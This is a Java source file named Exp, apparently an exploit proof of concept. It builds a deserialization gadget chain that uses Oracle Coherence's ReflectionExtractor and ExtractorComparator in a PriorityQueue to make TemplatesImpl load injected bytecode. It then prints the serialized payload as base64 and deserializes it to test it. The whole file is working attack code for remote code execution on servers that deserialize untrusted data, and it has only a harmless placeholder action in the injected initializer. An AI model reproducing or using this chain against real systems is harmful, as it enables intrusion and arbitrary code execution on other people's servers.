import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ReflectionExtractor;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class Exp {
    public static void main(String[] args) throws ClassNotFoundException, NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException {
        String code = "{printName();}";
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(test.class.getName());
        clazz.setSuperclass(pool.get(Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet").getName()));
        clazz.makeClassInitializer().insertBefore(code);
        pool.insertClassPath(String.valueOf(AbstractTranslet.class));
        CtClass ctClass = pool.get(test.class.getName());
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        ctClass.makeClassInitializer().insertAfter(code);
        ctClass.setName("evil");
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_name", "asd");
        setField(templates, "_bytecodes", new byte[][]{bytes});
        setField(templates, "_tfactory", new TransformerFactoryImpl());
        ReflectionExtractor reflectionExtractor = new ReflectionExtractor("newTransformer");
        ExtractorComparator extractorComparator = new ExtractorComparator(reflectionExtractor);
        //PriorityQueue 实例
        PriorityQueue priorityQueue = new PriorityQueue(2);
        //先设置为正常变量值，后面可以通过setFieldValue修改
        priorityQueue.add(1);
        priorityQueue.add(1);
        //反射设置 Field
        Object[] objects = new Object[]{templates, templates};
        setField(priorityQueue, "queue", objects);
        setField(priorityQueue, "comparator", extractorComparator);
        ByteArrayOutputStream bas = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bas);
        oos.writeObject(priorityQueue);
        String baseStr = (new String(Base64.getEncoder().encode(bas.toByteArray())));
//        System.out.println(new String(bas.toByteArray()));
        System.out.println(baseStr);
        byte[] decode = Base64.getDecoder().decode(baseStr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decode));
        ois.readObject();
//        ByteArrayInputStream bis = new ByteArrayInputStream(bas.toByteArray());
//        ObjectInputStream ois = new ObjectInputStream(bis);
//        ois.readObject();
    }

    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
